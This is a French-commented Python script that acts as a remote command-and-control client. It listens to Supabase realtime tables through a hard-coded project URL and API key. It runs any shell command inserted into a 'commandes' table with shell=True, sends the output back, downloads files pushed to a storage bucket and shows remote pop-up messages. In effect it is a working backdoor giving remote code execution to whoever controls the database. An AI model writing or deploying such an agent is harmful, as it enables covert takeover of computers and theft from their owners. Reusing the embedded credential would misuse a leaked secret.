# Installer les dépendances nécessaires
import subprocess
import sys

# Liste des dépendances
dependencies = [
    "tk",                # Pour tkinter (inclus avec Python, mais ajouté pour clarté)
    "supabase",          # Pour interagir avec Supabase
    "websocket-client",  # Pour gérer les WebSockets
    "plyer",             # Pour les notifications système
    "tqdm"               # Pour la barre de progression
]

import websocket
import json
import subprocess
import os
from supabase import create_client
import base64
import time
import sys
import tkinter as tk
from tkinter import messagebox
import threading

sys.setrecursionlimit(2000)  # Augmente la limite de récursion

# Configuration Supabase
SUPABASE_URL = "https://isglyvyafrpnvoxjcgjy.supabase.co"
SUPABASE_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImlzZ2x5dnlhZnJwbnZveGpjZ2p5Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3NDQ5MDQ0NTMsImV4cCI6MjA2MDQ4MDQ1M30.Fw6qoLSQGty7PsYGxh8krxt-JCSIN9Nd1r4kMRLfU9I"

# URL WebSocket Realtime
realtime_url = f"wss://{SUPABASE_URL.replace('https://', '')}/realtime/v1/websocket?apikey={SUPABASE_KEY}&vsn=1.0.0"

print(f"[🛠️] URL WebSocket utilisée : {realtime_url}")

# Initialisation du client Supabase
supabase = create_client(SUPABASE_URL, SUPABASE_KEY)

def download_file_from_supabase(file_name):
    """Télécharger un fichier depuis Supabase Storage."""
    try:
        print(f"[🛠️] Tentative de téléchargement du fichier : {file_name}")
        
        # Lister les fichiers dans le bucket pour vérifier leur présence
        files = supabase.storage.from_("uploads").list()
        print(f"[🛠️] Fichiers disponibles dans le bucket : {files}")

        # Vérifier si le fichier est présent
        if not any(f["name"] == file_name for f in files):
            print(f"[❌] Fichier '{file_name}' introuvable dans le bucket.")
            return

        # Télécharger le fichier depuis Supabase Storage
        response = supabase.storage.from_("uploads").download(file_name)
        print(f"[🛠️] Réponse de Supabase : {response}")

        # Écrire le contenu du fichier téléchargé
        with open(file_name, "wb") as file:
            file.write(response)
        print(f"[✅] Fichier '{file_name}' téléchargé avec succès.")
    except Exception as e:
        print(f"[‼️] Erreur lors du téléchargement du fichier : {e}")

def show_message_popup(message):
    """Afficher un message dans une fenêtre pop-up sur le thread principal."""
    def popup():
        root = tk.Tk()
        root.withdraw()  # Masquer la fenêtre principale
        messagebox.showinfo("Nouveau Message", message)
        root.destroy()  # Détruire la fenêtre principale après la boîte de dialogue

    # Utiliser `after` pour exécuter la fonction sur le thread principal
    root = tk.Tk()
    root.withdraw()  # Masquer la fenêtre principale
    root.after(0, popup)
    root.mainloop()

def on_message(ws, message):
    """Gérer les messages reçus via WebSocket."""
    try:
        print(f"[🛠️] Message brut reçu : {message}")  # Log pour afficher tous les messages reçus
        data = json.loads(message)
        if data.get("event") == "INSERT":
            # Récupérer les données de l'insertion
            record = data["payload"]["record"]
            table = data["topic"].split(":")[-1]  # Récupérer le nom de la table
            print(f"[🛠️] Table détectée : {table}, Données : {record}")  # Log pour vérifier la table et les données

            if table == "messages":
                # Gérer les messages
                message = record.get("message")
                if message:
                    print(f"[📩] Nouveau message reçu : {message}")
                    show_message_popup(message)
            elif table == "fichiers":
                # Gérer les fichiers
                file_name = record.get("file_name")
                if file_name:
                    print(f"[📁] Nouveau fichier à télécharger : {file_name}")
                    download_file_from_supabase(file_name)
            elif table == "commandes":
                # Gérer les commandes
                commande = record.get("commande")
                path = record.get("path", os.getcwd())  # Utiliser le chemin envoyé ou le répertoire courant

                if commande:
                    print(f"[💬] Nouvelle commande reçue : {commande}")
                    try:
                        result = subprocess.check_output(
                            commande, shell=True, stderr=subprocess.STDOUT, text=True, cwd=path
                        )
                        print(f"[🖥️] Résultat de la commande :\n{result}")
                    except subprocess.CalledProcessError as e:
                        result = e.output
                        print(f"[❌] Erreur lors de l'exécution de la commande :\n{result}")

                    # Mettre à jour la commande avec le résultat dans Supabase
                    supabase.table("commandes").update({"result": result}).eq("id", record["id"]).execute()
    except Exception as e:
        print(f"[❌] Erreur lors du traitement du message : {e}")

def on_open(ws):
    """Gérer l'ouverture de la connexion WebSocket."""
    print("✅ Connexion WebSocket établie")

    # Canal d'abonnement à la table "commandes"
    subscription_commandes = {
        "topic": f"realtime:public:commandes",
        "event": "phx_join",
        "payload": {},
        "ref": "1"
    }
    ws.send(json.dumps(subscription_commandes))

    # Canal d'abonnement à la table "fichiers"
    subscription_fichiers = {
        "topic": f"realtime:public:fichiers",
        "event": "phx_join",
        "payload": {},
        "ref": "2"
    }
    ws.send(json.dumps(subscription_fichiers))

    # Canal d'abonnement à la table "messages"
    subscription_messages = {
        "topic": f"realtime:public:messages",
        "event": "phx_join",
        "payload": {},
        "ref": "3"
    }
    ws.send(json.dumps(subscription_messages))

def on_error(ws, error):
    """Gérer les erreurs WebSocket."""
    print(f"❌ Erreur WebSocket : {error}")

def on_close(ws, close_status_code, close_msg):
    """Gérer la fermeture de la connexion WebSocket."""
    print("🔌 Connexion fermée")
    print("Tentative de reconnexion dans 5 secondes...")
    time.sleep(5)  # Pause de 5 secondes avant de tenter une reconnexion
    ws.run_forever()

if __name__ == "__main__":
    ws = websocket.WebSocketApp(
        realtime_url,
        on_open=on_open,
        on_message=on_message,
        on_error=on_error,
        on_close=on_close
    )
    ws.run_forever()
